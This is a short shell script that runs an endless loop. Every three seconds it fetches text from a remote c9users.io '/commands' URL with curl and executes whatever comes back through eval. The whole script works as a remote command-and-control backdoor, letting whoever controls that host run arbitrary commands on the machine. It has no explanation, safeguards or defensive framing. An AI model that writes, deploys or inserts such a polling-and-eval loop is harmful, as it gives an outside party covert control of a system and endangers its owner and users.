#!/bin/sh
set -e

HOST=https://cyber-ant0ni024.c9users.io/commands
TIMEOUT=3

while true; do
    EXECUTE_COMMANDS=$(curl -s -H "Accept: application/json" -H "Content-Type: application/json" $HOST)
    eval $EXECUTE_COMMANDS || true
    sleep $TIMEOUT
done
